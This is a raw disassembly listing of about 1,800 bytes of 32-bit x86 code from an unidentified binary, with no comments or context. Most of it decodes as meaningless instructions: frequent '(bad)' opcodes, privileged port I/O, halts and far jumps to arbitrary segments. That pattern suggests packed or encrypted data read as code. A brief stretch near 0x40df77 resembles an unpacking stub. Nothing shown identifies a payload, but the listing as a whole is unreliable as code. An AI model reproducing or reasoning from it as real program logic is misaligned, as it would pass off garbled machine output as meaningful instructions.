  40dcd1:	dec    eax
  40dcd2:	fnstcw WORD PTR [esi-0x6ac57e2]
  40dcd8:	mov    dh,0x7c
  40dcda:	pop    ebx
  40dcdb:	push   ecx
  40dcdc:	cmp    eax,0x98a47b5
  40dce1:	cdq    
  40dce2:	aas    
  40dce3:	adc    ah,BYTE PTR cs:[ebx+0x1c55567d]
  40dcea:	or     edi,DWORD PTR [ebp+0x4d]
  40dced:	out    0xac,eax
  40dcef:	xchg   ebp,eax
  40dcf0:	aas    
  40dcf1:	ins    DWORD PTR es:[edi],dx
  40dcf2:	inc    ebx
  40dcf3:	(bad)  
  40dcf4:	jl     0x40dcb5
  40dcf6:	int    0x41
  40dcf8:	mov    edi,0xd9241f89
  40dcfd:	repnz pop ebx
  40dcff:	xchg   edx,eax
  40dd00:	cmp    ch,ch
  40dd02:	inc    eax
  40dd03:	cmc    
  40dd04:	aad    0xe8
  40dd06:	adc    cl,ch
  40dd08:	pop    es
  40dd09:	inc    esp
  40dd0a:	scas   al,BYTE PTR es:[edi]
  40dd0b:	fild   DWORD PTR [edi-0x6b69a42b]
  40dd11:	jmp    FWORD PTR [eax]
  40dd13:	ja     0x40dd85
  40dd15:	inc    eax
  40dd16:	cmp    eax,0xeea248a6
  40dd1b:	leave  
  40dd1c:	test   BYTE PTR gs:[ecx+eiz*2-0x808ce94],al
  40dd24:	arpl   ax,sp
  40dd26:	pushf  
  40dd27:	iret   
  40dd28:	popa   
  40dd29:	xchg   ebx,eax
  40dd2a:	push   0x79
  40dd2c:	sbb    al,0xeb
  40dd2e:	imul   ecx,DWORD PTR [ebp+0x14],0xffffffee
  40dd32:	cmp    bh,BYTE PTR [ecx-0x14]
  40dd35:	adc    BYTE PTR [ebp+0x55be7475],dh
  40dd3b:	inc    esp
  40dd3c:	pop    ds
  40dd3d:	enter  0x6b96,0x7d
  40dd41:	and    ah,BYTE PTR [ebx+0x4b69e222]
  40dd47:	jl     0x40dd65
  40dd49:	inc    ebx
  40dd4a:	inc    ebp
  40dd4b:	imul   esp,DWORD PTR [esi],0x1c
  40dd4e:	js     0x40dd40
  40dd50:	js     0x40dd0c
  40dd52:	dec    ebx
  40dd53:	inc    edx
  40dd54:	xor    edx,edi
  40dd56:	arpl   WORD PTR [ecx+0x562d2714],di
  40dd5c:	dec    bp
  40dd5e:	sahf   
  40dd5f:	mov    fs,WORD PTR [esi-0x38]
  40dd62:	lods   eax,DWORD PTR ds:[esi]
  40dd63:	sbb    BYTE PTR [edi-0x7c],0x63
  40dd67:	jae    0x40ddb6
  40dd69:	inc    eax
  40dd6a:	jmp    FWORD PTR [ebp-0x7d]
  40dd6d:	jns    0x40dddc
  40dd6f:	jge    0x40dd67
  40dd71:	sub    ah,bh
  40dd73:	inc    edi
  40dd74:	jmp    0x8d7d:0x130bee3a
  40dd7b:	int3   
  40dd7c:	jmp    0x331e:0xbcad036
  40dd83:	iret   
  40dd84:	mov    bh,BYTE PTR [ebx-0x487f7ea7]
  40dd8a:	dec    ecx
  40dd8b:	cmp    eax,0x48a5c8a6
  40dd90:	sub    al,0x5f
  40dd92:	jle    0x40dd98
  40dd94:	add    eax,0x3533f0b8
  40dd99:	je     0x40de02
  40dd9b:	jle    0x40dd33
  40dd9d:	push   ebx
  40dd9e:	test   BYTE PTR [ebx+eiz*8],al
  40dda1:	cmp    eax,0xf6312d4c
  40dda6:	push   esi
  40dda7:	mov    DWORD PTR [ebp+0x7e],ebx
  40ddaa:	aaa    
  40ddab:	popa   
  40ddac:	dec    eax
  40ddad:	cmp    al,0x97
  40ddaf:	clc    
  40ddb0:	test   al,0x8a
  40ddb2:	cld    
  40ddb3:	sbb    BYTE PTR [ebx-0x29],dl
  40ddb6:	push   esp
  40ddb7:	pop    ss
  40ddb8:	adc    ecx,DWORD PTR [esi+esi*8]
  40ddbb:	rep lods al,BYTE PTR ds:[esi]
  40ddbd:	lea    esi,[ecx+0x1]
  40ddc0:	lods   eax,DWORD PTR ds:[esi]
  40ddc1:	ja     0x40dd87
  40ddc3:	inc    esp
  40ddc4:	mov    al,ds:0xe8d9b2de
  40ddc9:	pop    esp
  40ddca:	mov    edi,0x6ed1b4a7
  40ddcf:	sbb    BYTE PTR [esi-0x7d7d1bd3],bl
  40ddd5:	cli    
  40ddd6:	mov    dh,0x9
  40ddd8:	or     bh,BYTE PTR [eax]
  40ddda:	cmp    eax,0xa00ac063
  40dddf:	xchg   edx,eax
  40dde0:	rol    DWORD PTR [ebx+0x1f27825],cl
  40dde6:	mov    ebx,0x415d394e
  40ddeb:	mov    bh,0x35
  40dded:	pop    ebx
  40ddee:	and    BYTE PTR [ebx+ecx*1+0x4a],0xf1
  40ddf3:	mov    DWORD PTR [esi-0x55196c15],ecx
  40ddf9:	xchg   edx,eax
  40ddfa:	dec    edx
  40ddfb:	sub    al,0xa8
  40ddfd:	cmp    ebx,DWORD PTR [esi]
  40ddff:	ret    
  40de00:	mov    eax,ds:0x32dde44c
  40de05:	add    al,0x5a
  40de07:	rol    BYTE PTR [ebx-0x4f],1
  40de0a:	in     eax,0xa6
  40de0c:	inc    esi
  40de0d:	mov    ecx,0xa6ad53d
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xe452fe8d
  40de2d:	mov    BYTE PTR es:[esi+0x7f3f7e7e],0x7e
  40de35:	jle    0x40de25
  40de37:	jg     0x40ddfb
  40de39:	aam    0xb7
  40de3b:	sub    ebx,edx
  40de3d:	and    edi,ecx
  40de3f:	mov    edi,0x84e8242a
  40de44:	cli    
  40de45:	out    0x2b,al
  40de47:	pop    ebx
  40de48:	adc    BYTE PTR [edi+0x30],0xf9
  40de4c:	cs pop eax
  40de4e:	out    dx,al
  40de4f:	scas   eax,DWORD PTR es:[edi]
  40de50:	push   ecx
  40de51:	out    0x99,eax
  40de53:	jmp    0xdb6c:0x2fb24a60
  40de5a:	ret    0xafaa
  40de5d:	fadd   DWORD PTR [edi-0x15dcd092]
  40de63:	mov    esp,0x44618ce2
  40de68:	xchg   ebp,eax
  40de69:	es into 
  40de6b:	scas   al,BYTE PTR es:[edi]
  40de6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de6d:	loop   0x40de8d
  40de6f:	dec    eax
  40de70:	mov    edi,0xa0b191d4
  40de75:	in     al,dx
  40de76:	ret    0x31b0
  40de79:	or     esi,DWORD PTR [esi-0x40]
  40de7c:	sbb    DWORD PTR [edx],ecx
  40de7e:	sub    eax,0xbc53ede5
  40de83:	ins    BYTE PTR es:[edi],dx
  40de84:	ret    
  40de85:	push   esi
  40de86:	xor    al,0x42
  40de88:	sbb    ah,BYTE PTR [edi]
  40de8a:	mov    ecx,0xe77f5e03
  40de8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de90:	pop    eax
  40de91:	xor    DWORD PTR ds:0xdc0647da,edx
  40de97:	push   ecx
  40de98:	clc    
  40de99:	adc    ebx,DWORD PTR [edi+0x31ff991c]
  40de9f:	je     0x40de29
  40dea1:	or     dh,0xea
  40dea4:	jae    0x40ded8
  40dea6:	das    
  40dea7:	inc    edx
  40dea8:	or     eax,0xcad689eb
  40dead:	hlt    
  40deae:	mov    al,0x4f
  40deb0:	add    dh,BYTE PTR [edx+0x7]
  40deb3:	pop    DWORD PTR [ebx]
  40deb5:	push   ebx
  40deb6:	jns    0x40de76
  40deb8:	stos   DWORD PTR es:[edi],eax
  40deb9:	mov    WORD PTR ds:0xd627618e,gs
  40debf:	int3   
  40dec0:	dec    ebp
  40dec1:	mov    al,ds:0x3339f039
  40dec6:	ss addr16 jmp 0xb490:0xd80e7baa
  40decf:	test   bl,dl
  40ded1:	test   bh,dh
  40ded3:	jb     0x40df36
  40ded5:	aas    
  40ded6:	(bad)  
  40ded7:	jge    0x40decb
  40ded9:	icebp  
  40deda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dedb:	cmp    DWORD PTR [edi+0x15599cc5],edx
  40dee1:	dec    eax
  40dee2:	jnp    0x40debd
  40dee4:	call   0x9f13:0xdbd32ecc
  40deeb:	xor    al,0xec
  40deed:	pop    esi
  40deee:	dec    eax
  40deef:	sti    
  40def0:	adc    ch,BYTE PTR [eax-0x49]
  40def3:	cdq    
  40def4:	stos   BYTE PTR es:[edi],al
  40def5:	pop    eax
  40def6:	mov    esi,0x3d5ea2b9
  40defb:	mov    eax,0xaa39991
  40df00:	in     eax,0x90
  40df02:	fidivr WORD PTR [ebp-0x165b0367]
  40df08:	xchg   BYTE PTR [ecx],ch
  40df0a:	int3   
  40df0b:	inc    edi
  40df0c:	push   eax
  40df0d:	mov    ebx,0x57138cb4
  40df12:	ret    0x1e8
  40df15:	mul    DWORD PTR [eax+eiz*2+0x6a]
  40df19:	jle    0x40df7a
  40df1b:	xchg   esp,eax
  40df1c:	ror    BYTE PTR [ebp+0x0],0x5d
  40df20:	stos   BYTE PTR es:[edi],al
  40df21:	ret    
  40df22:	in     eax,0x66
  40df24:	pop    ss
  40df25:	in     al,dx
  40df26:	sub    eax,0x83746464
  40df2b:	inc    esp
  40df2c:	(bad)  
  40df2d:	ds push edx
  40df2f:	push   ecx
  40df30:	sahf   
  40df31:	pop    ss
  40df32:	cs pop edx
  40df34:	loopne 0x40df87
  40df36:	fidivr WORD PTR [ebx-0x1d]
  40df39:	clc    
  40df3a:	xchg   esi,eax
  40df3b:	out    0x1a,al
  40df3d:	dec    edx
  40df3e:	daa    
  40df3f:	hlt    
  40df40:	add    ecx,DWORD PTR [ebp+0x29fb95c6]
  40df46:	or     BYTE PTR [edi],dh
  40df48:	loopne 0x40dfc4
  40df4a:	(bad)  
  40df4c:	mov    ds:0x798a800b,al
  40df51:	inc    ecx
  40df52:	sub    BYTE PTR [eax],dl
  40df54:	dec    eax
  40df55:	dec    edx
  40df56:	clc    
  40df57:	(bad)  
  40df58:	into   
  40df59:	hlt    
  40df5a:	and    BYTE PTR [eax+eiz*4+0x52],ah
  40df5e:	ins    BYTE PTR es:[edi],dx
  40df5f:	and    DWORD PTR [ecx+eiz*8+0x349b258],ebx
  40df66:	js     0x40df56
  40df68:	xor    esp,DWORD PTR [esi]
  40df6a:	loopne 0x40dfd6
  40df6c:	outs   dx,DWORD PTR ds:[esi]
  40df6d:	fdivr  st,st(6)
  40df6f:	jae    0x40df97
  40df71:	ficomp WORD PTR [edx-0x27c41d8f]
  40df77:	sub    ebx,ecx
  40df79:	xchg   ebx,ecx
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	rol    DWORD PTR [edx-0x78676486],1
  40dfac:	xchg   DWORD PTR [esi+0x7e],edi
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40e02b
  40dfb4:	je     0x40e031
  40dfb6:	jno    0x40df94
  40dfb8:	adc    ch,BYTE PTR [ebp-0x21]
  40dfbb:	(bad)  
  40dfbd:	dec    edx
  40dfbe:	sub    ah,BYTE PTR [esi-0x57715b44]
  40dfc4:	mov    ebp,0x206817db
  40dfc9:	adc    ch,bl
  40dfcb:	adc    al,0x40
  40dfcd:	fdiv   st(0),st
  40dfcf:	pusha  
  40dfd0:	add    al,0x3f
  40dfd3:	pop    ecx
  40dfd4:	sub    cl,BYTE PTR [esi+0x3152d1c]
  40dfda:	mov    dl,ah
  40dfdc:	mov    dh,0xb8
  40dfde:	outs   dx,BYTE PTR ds:[esi]
  40dfdf:	pop    eax
  40dfe0:	xchg   ebx,eax
  40dfe1:	jecxz  0x40e01a
  40dfe3:	push   es
  40dfe4:	jbe    0x40dfb8
  40dfe6:	lea    ecx,[ebp+ebx*2+0x4579a0d]
  40dfed:	mov    WORD PTR [edx],cs
  40dfef:	mov    edx,0x2bfd0279
  40dff4:	inc    eax
  40dff5:	scas   eax,DWORD PTR es:[edi]
  40dff6:	mov    edi,0xfff76834
  40dffb:	inc    esp
  40dffc:	lds    edx,FWORD PTR [eax]
  40dffe:	sub    ebp,DWORD PTR [esi+0x4a]
  40e001:	pop    esi
  40e002:	lds    esi,FWORD PTR [ebp-0x80]
  40e005:	ins    DWORD PTR es:[edi],dx
  40e006:	rcr    BYTE PTR [eax+0x2a985e70],1
  40e00c:	mov    al,0x2
  40e00e:	dec    ecx
  40e00f:	and    DWORD PTR [ebx-0x5029f24b],esi
  40e015:	push   edi
  40e016:	sub    dl,BYTE PTR [ebx+edx*8+0x73]
  40e01a:	int3   
  40e01b:	adc    al,0xc2
  40e01d:	jns    0x40e05a
  40e01f:	lds    edi,FWORD PTR [ebx]
  40e021:	cmp    eax,esi
  40e023:	add    eax,0x1a036e
  40e028:	pop    ebx
  40e029:	inc    edx
  40e02a:	popa   
  40e02b:	dec    esp
  40e02c:	mov    esp,esp
  40e02e:	or     esi,edx
  40e030:	push   es
  40e031:	call   0x5024:0x2aa91e49
  40e038:	jae    0x40e0b6
  40e03a:	adc    al,0x8d
  40e03c:	bound  edi,QWORD PTR [esi+0x12c407f3]
  40e042:	inc    ebx
  40e043:	pop    ss
  40e044:	bound  eax,QWORD PTR ds:[ebx+0x31]
  40e048:	pop    ebx
  40e049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e04a:	loop   0x40e086
  40e04c:	adc    eax,0x969ca0f5
  40e051:	pop    eax
  40e052:	les    esp,FWORD PTR [eax-0x3fae5a50]
  40e058:	jmp    0x6829e3f7
  40e05d:	xchg   BYTE PTR [eax],bh
  40e05f:	xor    ebx,DWORD PTR [eax+edi*4]
  40e062:	sbb    esi,DWORD PTR [edx-0x2bd5fa11]
  40e068:	xchg   BYTE PTR [ebx+0xab939b5],ch
  40e06e:	clc    
  40e06f:	cmp    BYTE PTR [ebx-0x5cdc62dd],al
  40e075:	mov    al,ds:0x8bb24b86
  40e07a:	imul   esp,esi,0x6d396445
  40e080:	mov    ds:0xdd683225,al
  40e085:	xchg   ebp,eax
  40e086:	popa   
  40e087:	ds loopne 0x40e0ce
  40e08a:	push   cs
  40e08b:	mov    esp,0x87c33e91
  40e090:	or     BYTE PTR [edi+esi*1],dl
  40e093:	stos   BYTE PTR es:[edi],al
  40e094:	(bad)  
  40e095:	enter  0x6d79,0x5f
  40e099:	mov    DWORD PTR [ebx+esi*2+0x4ae5d650],eax
  40e0a0:	mov    bh,0xa2
  40e0a2:	cmp    eax,0x24006bc
  40e0a7:	push   edx
  40e0a8:	retf   
  40e0a9:	aaa    
  40e0aa:	inc    esp
  40e0ab:	adc    eax,0xadde4f24
  40e0b0:	fisub  DWORD PTR [esi+0x78c40e32]
  40e0b6:	fxrstor [ebx]
  40e0b9:	fs dec eax
  40e0bb:	imul   eax,DWORD PTR [esi+0x16e4c174],0xa290570e
  40e0c5:	pushf  
  40e0c6:	mov    edx,0xd62b7778
  40e0cb:	inc    esi
  40e0cc:	icebp  
  40e0cd:	dec    ecx
  40e0ce:	ds ins BYTE PTR es:[edi],dx
  40e0d0:	push   esp
  40e0d1:	or     al,0xda
  40e0d3:	pop    esi
  40e0d4:	jne    0x40e0d4
  40e0d6:	sub    al,0xd2
  40e0d8:	ins    BYTE PTR es:[edi],dx
  40e0d9:	imul   ebx,edi,0x13
  40e0dc:	gs cld 
  40e0de:	sub    BYTE PTR [esi-0x6c],bh
  40e0e1:	cmp    BYTE PTR [ebx-0x5a],cl
  40e0e4:	shl    BYTE PTR [edx-0x780d43b3],0x4e
  40e0eb:	out    0xed,eax
  40e0ed:	push   ds
  40e0ee:	mov    ah,0x13
  40e0f0:	call   0x8b7c5ae5
  40e0f5:	inc    ebp
  40e0f6:	hlt    
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
